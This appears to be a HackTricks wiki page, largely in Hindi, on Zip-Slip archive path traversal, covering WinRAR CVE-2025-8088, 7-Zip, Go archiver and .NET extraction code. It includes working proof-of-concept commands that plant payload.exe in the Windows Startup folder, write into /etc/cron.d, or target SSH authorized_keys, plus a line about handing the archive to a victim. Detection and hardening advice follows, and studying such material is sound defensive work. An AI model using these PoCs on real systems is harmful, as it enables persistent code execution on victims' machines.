# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## अवलोकन

कई archive formats (ZIP, RAR, TAR, 7-ZIP, आदि) प्रत्येक एंट्री को अपना **internal path** रखने की अनुमति देते हैं। जब कोई extraction utility उस path को अंधविश्वास से मान लेती है, तो एक crafted filename जिसमें `..` या एक **absolute path** (उदा. `C:\Windows\System32\`) होगा, वह user-चुने हुए directory के बाहर लिखा जा सकता है।
इस तरह की vulnerability को व्यापक रूप से *Zip-Slip* या **archive extraction path traversal** के नाम से जाना जाता है।

परिणाम मनमाने फ़ाइलों को overwrite करने से लेकर सीधे **remote code execution (RCE)** हासिल करने तक हो सकते हैं, यदि कोई payload किसी **auto-run** स्थान जैसे Windows *Startup* फ़ोल्डर में छोड़ा जाता है।

## मूल कारण

1. हमलावर एक archive बनाता है जहाँ एक या अधिक file headers में शामिल होते हैं:
* Relative traversal sequences (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Absolute paths (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* Or crafted **symlinks** that resolve outside the target dir (common in ZIP/TAR on *nix*).
2. पीड़ित उस archive को एक vulnerable tool के साथ extract करता है जो embedded path पर भरोसा करता है (या symlinks का पालन करता है) बजाय कि उसे sanitize करने या चुने गए directory के नीचे extract करने के।
3. फ़ाइल attacker-controlled लोकेशन में लिखी जाती है और अगली बार जब सिस्टम या उपयोगकर्ता उस path को ट्रिगर करते हैं तो वह execute/loaded हो जाती है।

### .NET `Path.Combine` + `ZipArchive` traversal

A common .NET anti-pattern is combining the intended destination with **user-controlled** `ZipArchiveEntry.FullName` and extracting without path normalisation:
```csharp
using (var zip = ZipFile.OpenRead(zipPath))
{
foreach (var entry in zip.Entries)
{
var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
entry.ExtractToFile(dest);
}
}
```
- यदि `entry.FullName` `..\\` से शुरू होता है तो यह traverses; यदि यह एक **absolute path** है तो बाएँ घटक पूरी तरह से हटा दिया जाता है, जिससे extraction identity के रूप में एक **arbitrary file write** हो जाता है।
- एक proof-of-concept archive जो sibling `app` डायरेक्टरी में लिखा जाए और जिसे एक scheduled scanner द्वारा मॉनिटर किया जा रहा हो:
```python
import zipfile
with zipfile.ZipFile("slip.zip", "w") as z:
z.writestr("../app/0xdf.txt", "ABCD")
```
उस ZIP को monitored inbox में डालने पर परिणामस्वरूप `C:\samples\app\0xdf.txt` बनता है, जो `C:\samples\queue\` के बाहर traversal को प्रमाणित करता है और follow-on primitives (e.g., DLL hijacks) को सक्षम करता है।

## वास्तविक उदाहरण – WinRAR ≤ 7.12 (CVE-2025-8088)

Windows के लिए WinRAR (जिसमें `rar` / `unrar` CLI, the DLL और the portable source शामिल हैं) extraction के दौरान filenames को validate करने में विफल रहा।
एक malicious RAR archive जिसमें निम्नलिखित जैसी entry हो:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
वह चयनित आउटपुट निर्देशिका के **बाहर** और उपयोगकर्ता के *Startup* फ़ोल्डर के अंदर आ जाएगा। लॉगऑन के बाद Windows वहाँ मौजूद सभी चीज़ों को स्वचालित रूप से निष्पादित करता है, जिससे *स्थायी* RCE मिलता है।

### PoC Archive बनाना (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
उपयोग किए गए विकल्प:
* `-ep`  – फ़ाइल पाथ को बिल्कुल उसी तरह स्टोर करें जैसा दिया गया है (leading `./` को prune न करें)।

`evil.rar` को पीड़ित को सौंपें और उन्हें एक vulnerable WinRAR build के साथ इसे extract करने के निर्देश दें।

### Observed Exploitation in the Wild

ESET ने RomCom (Storm-0978/UNC2596) spear-phishing अभियान की रिपोर्ट दी जिसमें RAR आर्काइव्स का उपयोग CVE-2025-8088 का दुरुपयोग करके customised backdoors तैनात करने और ransomware संचालन को सहज बनाने के लिए किया गया था।

## Newer Cases (2024–2025)

### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
* **बग**: ZIP एंट्रीज़ जो **symbolic links** हैं, extraction के दौरान dereference की जाती थीं, जिससे हमलावर destination directory से बाहर निकलकर arbitrary paths overwrite कर सकते थे। उपयोगकर्ता की इंटरैक्शन बस *archive खोलना/extract करना* है।
* **प्रभावित**: 7-Zip 21.02–24.09 (Windows & Linux builds). फिक्स **25.00** (July 2025) और बाद के बिल्ड में किया गया।
* **प्रभाव का रास्ता**: `Start Menu/Programs/Startup` या service-run स्थानों को overwrite करें → अगली logon या service restart पर कोड चल जाता है।
* **Quick PoC (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
patched बिल्ड पर `/etc/cron.d` छुआ नहीं जाएगा; symlink /tmp/target के अंदर एक लिंक के रूप में extract होगा।

### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
* **बग**: `archiver.Unarchive()` `../` और symlinked ZIP एंट्रीज़ का पालन करता है, जिससे `outputDir` के बाहर लिखा जा सकता है।
* **प्रभावित**: `github.com/mholt/archiver` ≤ 3.5.1 (प्रोजेक्ट अब deprecated है)।
* **फिक्स**: `mholt/archives` ≥ 0.1.0 पर स्विच करें या लिखने से पहले canonical-path चेक इम्प्लीमेंट करें।
* **Minimal reproduction**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Detection Tips

* **Static inspection** – आर्काइव एंट्रीज़ को सूचीबद्ध करें और किसी भी नाम को फ्लैग करें जिसमें `../`, `..\\`, *absolute paths* (`/`, `C:`) हों या ऐसी एंट्रीज़ हों जिनका प्रकार *symlink* है और जिनका लक्ष्य extraction dir के बाहर है।
* **Canonicalisation** – सुनिश्चित करें `realpath(join(dest, name))` अभी भी `dest` से शुरू होता है। अन्यथा reject करें।
* **Sandbox extraction** – एक disposable डायरेक्टरी में decompress करें एक *safe* extractor का उपयोग करके (उदा., `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) और सत्यापित करें कि परिणामस्वरूप पाथ्स डायरेक्टरी के अंदर ही रहें।
* **Endpoint monitoring** – WinRAR/7-Zip/आदि द्वारा किसी आर्काइव के खोले जाने के थोड़े समय बाद `Startup`/`Run`/`cron` स्थानों में लिखी गई नई executables पर अलर्ट करें।

## Mitigation & Hardening

1. **Extractor को अपडेट करें** – WinRAR 7.13+ और 7-Zip 25.00+ path/symlink sanitisation लागू करते हैं। दोनों टूल्स अभी भी auto-update से रहित हैं।
2. जहां संभव हो, आर्काइव को “**Do not extract paths**” / “**Ignore paths**” विकल्प के साथ extract करें।
3. Unix पर, extraction से पहले privileges घटाएँ और एक **chroot/namespace** माउंट करें; Windows पर, **AppContainer** या किसी sandbox का उपयोग करें।
4. यदि कस्टम कोड लिख रहे हैं, तो create/write से पहले `realpath()`/`PathCanonicalize()` के साथ normalise करें, और किसी भी एंट्री को reject कर दें जो destination से बाहर निकलती है।

## Additional Affected / Historical Cases

* 2018 – Massive *Zip-Slip* advisory by Snyk जिसने कई Java/Go/JS लाइब्रेरीज़ को प्रभावित किया।
* 2023 – 7-Zip CVE-2023-4011 समान traversal `-ao` merge के दौरान।
* 2025 – HashiCorp `go-slug` (CVE-2025-0377) TAR extraction traversal in slugs (patch in v1.2)।
* कोई भी कस्टम extraction लॉजिक जो create/write से पहले `PathCanonicalize` / `realpath` को कॉल करने में विफल रहता है।

## References

- [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
- [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

{{#include ../banners/hacktricks-training.md}}
